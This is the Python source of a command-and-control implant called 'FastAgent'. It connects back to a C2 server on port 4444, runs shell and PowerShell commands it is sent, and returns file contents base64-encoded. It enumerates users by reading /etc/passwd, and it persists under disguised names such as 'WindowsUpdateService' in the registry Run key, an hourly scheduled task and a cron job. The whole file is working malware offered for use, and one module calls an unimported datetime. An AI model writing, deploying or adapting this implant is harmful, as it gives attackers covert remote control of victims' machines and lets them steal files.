#!/usr/bin/env python3
import socket
import json
import platform
import getpass
import uuid
import time
import subprocess
import os
import sys
import base64

class FastAgent:
    def __init__(self, server_host='127.0.0.1', server_port=4444, agent_id=None):
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.running = True
        self.current_directory = os.getcwd()
        
    def get_system_info(self):
        return {
            'hostname': platform.node(),
            'username': getpass.getuser(),
            'architecture': platform.architecture()[0],
            'os_version': platform.platform(),
            'python_version': platform.python_version(),
            'current_directory': self.current_directory
        }
    
    def connect(self):
        print(f"[🚀] Fast Agent with Modules starting... ID: {self.agent_id}")
        print(f"[→] Connecting to {self.server_host}:{self.server_port}")
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30.0)
                sock.connect((self.server_host, self.server_port))
                
                print("[✓] Connected to C2 server")
                
                checkin_msg = {
                    'type': 'checkin',
                    'agent_id': self.agent_id,
                    'system_info': self.get_system_info()
                }
                sock.send(json.dumps(checkin_msg).encode('utf-8'))
                
                while self.running:
                    try:
                        data = sock.recv(4096).decode('utf-8')
                        if not data:
                            break
                            
                        message = json.loads(data)
                        if message.get('type') == 'job':
                            self.execute_and_respond(sock, message)
                            
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError:
                        continue
                    except Exception as e:
                        print(f"[-] Communication error: {e}")
                        break
                        
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                print(f"[*] Reconnecting in 5 seconds...")
                time.sleep(5)
    
    def execute_and_respond(self, sock, job_message):
        job_id = job_message['job_id']
        module_name = job_message['module_name']
        arguments = job_message.get('arguments', {})
        
        print(f"[+] Executing: {module_name}")
        
        try:
            # System Information Modules
            if module_name == 'sysinfo':
                result = self.module_sysinfo(arguments)
            elif module_name == 'process_list':
                result = self.module_process_list(arguments)
            
            # Command Execution Modules
            elif module_name == 'shell':
                result = self.module_shell(arguments)
            elif module_name == 'powershell':
                result = self.module_powershell(arguments)
            
            # File Operation Modules
            elif module_name == 'download':
                result = self.module_download(arguments)
            elif module_name == 'upload':
                result = self.module_upload(arguments)
            elif module_name == 'file_browser':
                result = self.module_file_browser(arguments)
            
            # Persistence Modules
            elif module_name == 'persistence':
                result = self.module_persistence(arguments)
            
            # Reconnaissance Modules
            elif module_name == 'network_scan':
                result = self.module_network_scan(arguments)
            elif module_name == 'user_enum':
                result = self.module_user_enum(arguments)
            
            # Credential Access Modules
            elif module_name == 'dump_creds':
                result = self.module_dump_creds(arguments)
            
            else:
                result = f"Unknown module: {module_name}"
            
            response = {
                'type': 'job_result',
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': result,
                'success': True
            }
            
        except Exception as e:
            response = {
                'type': 'job_result', 
                'agent_id': self.agent_id,
                'job_id': job_id,
                'output': f"Error: {str(e)}",
                'success': False
            }
        
        sock.send(json.dumps(response).encode('utf-8'))
        print(f"[✓] Response sent for {job_id}")
    
    # ==================== MODULE IMPLEMENTATIONS ====================
    
    def module_sysinfo(self, arguments):
        """Comprehensive system information"""
        import psutil
        
        info = self.get_system_info()
        
        # Add detailed system info
        info['ram_total_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
        info['ram_available_gb'] = round(psutil.virtual_memory().available / (1024**3), 2)
        info['cpu_cores'] = psutil.cpu_count()
        info['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
        
        # Network information
        info['network_interfaces'] = {}
        for interface, addrs in psutil.net_if_addrs().items():
            info['network_interfaces'][interface] = [
                {'family': addr.family.name, 'address': addr.address}
                for addr in addrs
            ]
        
        # Disk information
        info['disk_usage'] = {}
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                info['disk_usage'][partition.mountpoint] = {
                    'total_gb': round(usage.total / (1024**3), 2),
                    'used_gb': round(usage.used / (1024**3), 2),
                    'free_gb': round(usage.free / (1024**3), 2)
                }
            except:
                pass
        
        return json.dumps(info, indent=2)
    
    def module_process_list(self, arguments):
        """List running processes"""
        import psutil
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent', 'cpu_percent', 'create_time']):
            try:
                processes.append(proc.info)
            except psutil.NoSuchProcess:
                continue
        
        processes.sort(key=lambda x: x['memory_percent'] or 0, reverse=True)
        
        result = "Running Processes (Top 20 by Memory):\n"
        result += "-" * 80 + "\n"
        result += f"{'PID':<8} {'Name':<20} {'User':<15} {'Memory %':<10} {'CPU %':<8}\n"
        result += "-" * 80 + "\n"
        
        for proc in processes[:20]:
            result += f"{proc['pid']:<8} {proc['name'][:19]:<20} {proc['username'][:14]:<15} {proc['memory_percent'] or 0:<10.2f} {proc['cpu_percent'] or 0:<8.2f}\n"
        
        return result
    
    def module_shell(self, arguments):
        """Execute shell command"""
        command = arguments.get('command', '')
        if not command:
            return "No command provided"
        
        try:
            # Change directory if needed
            if command.startswith('cd '):
                new_dir = command[3:].strip()
                try:
                    os.chdir(new_dir)
                    self.current_directory = os.getcwd()
                    return f"Changed directory to: {self.current_directory}"
                except Exception as e:
                    return f"cd failed: {str(e)}"
            
            result = subprocess.check_output(
                command, 
                shell=True, 
                stderr=subprocess.STDOUT,
                timeout=30,
                cwd=self.current_directory
            )
            return result.decode('utf-8', errors='ignore')
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def module_powershell(self, arguments):
        """Execute PowerShell command (Windows only)"""
        if platform.system() != 'Windows':
            return "PowerShell only available on Windows"
        
        command = arguments.get('command', '')
        if not command:
            return "No PowerShell command provided"
        
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', command],
                stderr=subprocess.STDOUT,
                timeout=30
            )
            return result.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"PowerShell error: {str(e)}"
    
    def module_download(self, arguments):
        """Download file from target to C2 server"""
        remote_path = arguments.get('remote_path', '')
        if not remote_path:
            return "No file path provided"
        
        try:
            # Resolve path
            if not os.path.isabs(remote_path):
                remote_path = os.path.join(self.current_directory, remote_path)
            
            if not os.path.exists(remote_path):
                return f"File not found: {remote_path}"
            
            with open(remote_path, 'rb') as f:
                file_content = f.read()
            
            # Encode file for transmission
            encoded_content = base64.b64encode(file_content).decode('utf-8')
            
            result = {
                'filename': os.path.basename(remote_path),
                'path': remote_path,
                'size': len(file_content),
                'content': encoded_content,
                'message': f"File ready for download: {os.path.basename(remote_path)}"
            }
            
            return json.dumps(result, indent=2)
            
        except Exception as e:
            return f"Download failed: {str(e)}"
    
    def module_upload(self, arguments):
        """Upload file to target (placeholder - would need server cooperation)"""
        return "Upload module - server-side implementation required"
    
    def module_file_browser(self, arguments):
        """Browse files and directories"""
        path = arguments.get('path', self.current_directory)
        action = arguments.get('action', 'list')
        
        try:
            if action == 'change_dir':
                os.chdir(path)
                self.current_directory = os.getcwd()
                return f"Changed to: {self.current_directory}"
            
            if not os.path.exists(path):
                return f"Path not found: {path}"
            
            if os.path.isfile(path):
                # Show file info
                stat = os.stat(path)
                result = f"File: {path}\n"
                result += f"Size: {stat.st_size} bytes\n"
                result += f"Modified: {time.ctime(stat.st_mtime)}\n"
                return result
            
            # List directory contents
            items = os.listdir(path)
            items.sort()
            
            result = f"Directory: {path}\n"
            result += "-" * 50 + "\n"
            
            for item in items:
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    result += f"[DIR]  {item}/\n"
                else:
                    size = os.path.getsize(full_path)
                    result += f"[FILE] {item} ({size} bytes)\n"
            
            return result
            
        except Exception as e:
            return f"File browser error: {str(e)}"
    
    def module_persistence(self, arguments):
        """Establish persistence mechanisms"""
        method = arguments.get('method', 'registry')
        system = platform.system().lower()
        
        if system == 'windows':
            return self.windows_persistence(method)
        elif system == 'linux':
            return self.linux_persistence(method)
        else:
            return f"Persistence not supported on {system}"
    
    def windows_persistence(self, method):
        try:
            if method == 'registry':
                import winreg
                
                current_path = os.path.abspath(sys.argv[0])
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    winreg.SetValueEx(reg_key, "WindowsUpdateService", 0, winreg.REG_SZ, current_path)
                
                return "Registry persistence established in HKCU Run"
                
            elif method == 'scheduled_task':
                current_path = os.path.abspath(sys.argv[0])
                task_name = "WindowsUpdateMaintenance"
                
                cmd = f'schtasks /create /tn "{task_name}" /tr "{current_path}" /sc hourly /mo 1 /f'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    return f"Scheduled task '{task_name}' created"
                else:
                    return f"Scheduled task failed: {result.stderr}"
                    
            else:
                return f"Unknown persistence method: {method}"
                
        except Exception as e:
            return f"Persistence failed: {str(e)}"
    
    def linux_persistence(self, method):
        try:
            if method == 'cron':
                current_path = os.path.abspath(sys.argv[0])
                cron_job = f"*/10 * * * * {current_path}\n"
                
                subprocess.run(f'(crontab -l ; echo "{cron_job}") | crontab -', 
                             shell=True, capture_output=True)
                
                return "Cron persistence established"
            else:
                return f"Unknown persistence method: {method}"
                
        except Exception as e:
            return f"Persistence failed: {str(e)}"
    
    def module_network_scan(self, arguments):
        """Scan local network"""
        try:
            import netifaces
            
            result = "Network Information:\n"
            result += "-" * 40 + "\n"
            
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    result += f"Interface: {interface}\n"
                    for addr in addrs[netifaces.AF_INET]:
                        result += f"  IP: {addr['addr']}\n"
                        result += f"  Netmask: {addr['netmask']}\n"
                    result += "-" * 40 + "\n"
            
            return result
            
        except ImportError:
            return "netifaces module required for network scanning"
        except Exception as e:
            return f"Network scan failed: {str(e)}"
    
    def module_user_enum(self, arguments):
        """Enumerate users and groups"""
        system = platform.system().lower()
        
        try:
            if system == 'windows':
                result = subprocess.check_output('net user', shell=True, text=True)
                return f"Windows Users:\n{result}"
            elif system == 'linux':
                result = subprocess.check_output('cat /etc/passwd', shell=True, text=True)
                return f"Linux Users:\n{result}"
            else:
                return f"User enum not supported on {system}"
                
        except Exception as e:
            return f"User enum failed: {str(e)}"
    
    def module_dump_creds(self, arguments):
        """Dump credentials (Windows only - placeholder)"""
        if platform.system() != 'Windows':
            return "Credential dumping only available on Windows"
        
        return "Credential dumping requires administrative privileges and specific tools"

if __name__ == "__main__":
    agent = FastAgent(server_host='127.0.0.1', server_port=4444)
    agent.connect()